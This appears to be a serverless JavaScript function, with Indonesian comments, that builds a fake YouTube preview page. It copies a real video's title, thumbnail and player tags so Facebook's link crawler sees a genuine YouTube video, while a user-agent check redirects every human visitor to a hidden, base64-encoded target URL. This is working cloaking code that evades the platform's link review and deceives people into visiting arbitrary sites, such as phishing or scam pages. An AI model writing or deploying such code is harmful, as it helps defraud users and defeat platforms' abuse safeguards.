export async function onRequest(context) {
  const url = new URL(context.request.url);
  const sEnc = url.searchParams.get('s'); 
  const uEnc = url.searchParams.get('u'); 

  if (!sEnc || !uEnc) return context.next();

  try {
    const sourceUrl = atob(sEnc);
    const targetUrl = atob(uEnc);

    // Ambil Data dari YouTube
    const response = await fetch(sourceUrl, {
      headers: { "User-Agent": "facebookexternalhit/1.1" }
    });
    const htmlText = await response.text();

    const titleMatch = htmlText.match(/<title>(.*?)<\/title>/);
    let title = titleMatch ? titleMatch[1].replace("- YouTube", "").trim() : "YouTube";

    let videoId = "";
    if (sourceUrl.includes("v=")) {
      videoId = sourceUrl.split("v=")[1].split("&")[0];
    } else {
      videoId = sourceUrl.split("/").pop().split("?")[0];
    }
    
    const image = `https://i.ytimg.com/vi/${videoId}/maxresdefault.jpg`;
    const embedUrl = `https://www.youtube.com/embed/${videoId}`;

    const fakeHtml = `<!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>${title}</title>
      
      <meta property="og:site_name" content="YouTube">
      <meta property="og:url" content="${sourceUrl}">
      <meta property="og:title" content="${title}">
      <meta property="og:image" content="${image}">
      <meta property="og:description" content="Tonton video asli di YouTube.">
      <meta property="og:type" content="video.other">
      
      <meta property="og:video:url" content="${embedUrl}">
      <meta property="og:video:secure_url" content="${embedUrl}">
      <meta property="og:video:type" content="text/html">
      <meta property="og:video:width" content="1280">
      <meta property="og:video:height" content="720">
      
      <meta name="twitter:card" content="player">
      <meta name="twitter:title" content="${title}">
      <meta name="twitter:image" content="${image}">
      <meta name="twitter:player" content="${embedUrl}">
      <meta name="twitter:player:width" content="1280">
      <meta name="twitter:player:height" content="720">

      <script>
        // REDIRECT MANUSIA KE TARGET
        if (!navigator.userAgent.includes("facebookexternalhit") && !navigator.userAgent.includes("Facebot")) {
          window.location.replace("${targetUrl}");
        }
      </script>
    </head>
    <body style="background:#000;"></body>
    </html>`;

    return new Response(fakeHtml, {
      headers: { "content-type": "text/html;charset=UTF-8" }
    });

  } catch (e) {
    return new Response(null, { status: 302, headers: { "Location": atob(uEnc) } });
  }
}
